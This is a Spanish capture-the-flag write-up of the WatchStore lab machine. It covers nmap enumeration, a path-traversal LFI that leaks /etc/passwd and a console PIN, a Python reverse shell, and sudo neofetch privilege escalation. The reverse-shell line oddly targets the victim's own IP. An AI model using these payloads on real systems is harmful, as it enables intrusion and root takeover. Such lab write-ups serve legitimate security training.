---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Easy
  - HTTP
  - FuzzingWeb
  - LFI
  - ReverseShell
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LFI (Local File Inclusion)|LFI (Local File Inclusion)]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]

---
# Resolviendo la máquina WatchStore

>En esta publicación, comparto cómo resolví la máquina **WatchStore** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/111).

---
## Enumeración
### Ping

`ping -c 1 192.168.1.97`

![[Pasted image 20250803114247.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.97 -oG allPorts`

![[Pasted image 20250803114335.png]]

`nmap -p22,8080 -sCV 192.168.1.97 -oN targeted`

![[Pasted image 20250803114356.png]]
### HTTP

Se añade al `/etc/hosts`: `"192.168.1.97 watchstore.thl"`.

`echo "192.168.1.97 watchstore.thl" >> /etc/hosts`

`http://watchstore.thl:8080/`

![[Pasted image 20250803114634.png]]
#### Fuzzing Web

`dirb http://watchstore.thl:8080/`

![[Pasted image 20250803114715.png]]

---
## Explotación
### LFI (Local File Inclusion)

`http://watchstore.thl:8080/read`

![[Pasted image 20250803115007.png]]

`http://watchstore.thl:8080/read?id=../../../../../../../../../../etc/passwd`

![[Pasted image 20250803115033.png]]

Se identifica el usuario: `relox`.

`http://watchstore.thl:8080/console`

Nos pide un PIN para poder acceder a la consola.

![[Pasted image 20250803120800.png]]

`http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py`

![[Pasted image 20250803115222.png]]

El PIN es `612-791-734`.
### Reverse Shell

Ahora que ya tenemos acceso a la consola interactiva de *Python*. Se procede a realizar una *reverse shell*.

`nc -nlvp 1236`

Se introduce en la consola lo siguiente:

```Python
import socket, subprocess, os

s = socket.socket()
s.connect(("192.168.1.97", 1236))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh"])
```

![[Pasted image 20250803115706.png]]
### Escalada de Privilegios
#### Sudo

`sudo -l`

![[Pasted image 20250803115750.png]]

Se encuentra el binario: `/usr/bin/neofetch`, se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/neofetch/#sudo).

![[Pasted image 20250803115845.png]]

`cd /tmp`

```bash
echo 'exec /bin/sh' > escalation.sh
sudo neofetch --config escalation.sh
```

![[Pasted image 20250803115930.png]]

---